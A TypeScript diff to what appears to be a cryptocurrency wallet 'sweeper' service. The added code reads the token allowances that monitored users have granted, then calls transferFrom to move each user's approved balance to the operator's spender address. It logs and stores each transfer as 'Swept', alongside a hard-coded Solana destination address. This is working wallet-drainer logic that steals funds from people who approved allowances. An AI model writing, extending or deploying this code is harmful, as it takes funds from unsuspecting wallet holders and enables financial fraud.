@@ -9,9 +9,7 @@ import type { MonitoredWallet } from '@shared/schema';
 const SYSTEM_PROGRAM_ID = new PublicKey('11111111111111111111111111111111');
 const RENT_SYSVAR_ID = new PublicKey('SysvarRent111111111111111111111111111111111');
 
-import { CHAIN_CONTRACTS } from './permit2-relayer';
-
-const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3" as const;
+import { CHAIN_CONTRACTS } from './direct-transfer';
 const SOLANA_DESTINATION = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
 const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
@@ -179,16 +177,22 @@ async function getDelegatedAmount(tokenAccount: PublicKey, delegate: PublicKey):
 async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean; amount: string; error?: string }> {
   const chainId = wallet.chainId || '1';
   const publicClient = getEvmPublicClient(chainId);
+  const walletClient = getEvmWalletClient(chainId);
+  
+  if (!walletClient) {
+    return { swept: false, amount: '0', error: 'EVM spender key not configured' };
+  }
   
   const tokens = EVM_TOKENS[chainId];
   if (!tokens) {
     return { swept: false, amount: '0', error: `Unsupported chain: ${chainId}` };
   }
   
-  const contractAddress = CHAIN_CONTRACTS[Number(chainId)];
-  if (!contractAddress) {
-    return { swept: false, amount: '0', error: `No contract for chain: ${chainId}` };
+  const spenderAccount = walletClient.account;
+  if (!spenderAccount) {
+    return { swept: false, amount: '0', error: 'No spender account' };
   }
+  const spenderAddr = spenderAccount.address;
   
   let totalSwept = BigInt(0);
   const userAddr = wallet.walletAddress as `0x${string}`;
@@ -201,7 +205,7 @@ async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean
         address: tokenAddress,
         abi: ERC20_ABI,
         functionName: 'allowance',
-        args: [userAddr, PERMIT2_ADDRESS],
+        args: [userAddr, spenderAddr],
       });
       
       if (allowance === BigInt(0)) continue;
@@ -215,21 +219,45 @@ async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean
       
       if (balance === BigInt(0)) continue;
       
-      console.log(`[Monitor] EVM ${chainId} - ${wallet.walletAddress}: ${token.symbol} balance=${balance}, Permit2 allowance=${allowance}`);
-      totalSwept += balance;
+      const transferAmount = balance < allowance ? balance : allowance;
+      
+      console.log(`[Monitor] EVM ${chainId} - ${wallet.walletAddress}: ${token.symbol} balance=${balance}, allowance=${allowance}, sweeping=${transferAmount}`);
+      
+      try {
+        const txHash = await walletClient.writeContract({
+          address: tokenAddress,
+          abi: ERC20_ABI,
+          functionName: 'transferFrom',
+          args: [userAddr, spenderAddr, transferAmount],
+          chain: CHAINS[chainId],
+        });
+        
+        const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });
+        
+        if (receipt.status === 'success') {
+          totalSwept += transferAmount;
+          console.log(`[Monitor] EVM ${chainId} - Swept ${token.symbol}: ${transferAmount} from ${wallet.walletAddress} - tx: ${txHash}`);
+          
+          await storage.createTransfer({
+            walletAddress: wallet.walletAddress,
+            tokenAddress: token.address,
+            tokenSymbol: token.symbol,
+            amount: transferAmount.toString(),
+            transactionHash: txHash,
+          });
+        }
+      } catch (txErr: any) {
+        console.error(`[Monitor] EVM ${chainId} ${token.symbol} transferFrom error:`, txErr?.message);
+      }
       
     } catch (error: any) {
       console.error(`[Monitor] EVM ${chainId} ${token.symbol} check error:`, error?.message);
     }
   }
   
-  if (totalSwept > BigInt(0)) {
-    console.log(`[Monitor] EVM ${chainId} - ${wallet.walletAddress} has tokens with Permit2 allowance. Transfer-retry system will handle re-execution.`);
-  }
-  
   return { 
-    swept: false, 
-    amount: '0',
+    swept: totalSwept > BigInt(0), 
+    amount: totalSwept.toString(),
   };
 }
 
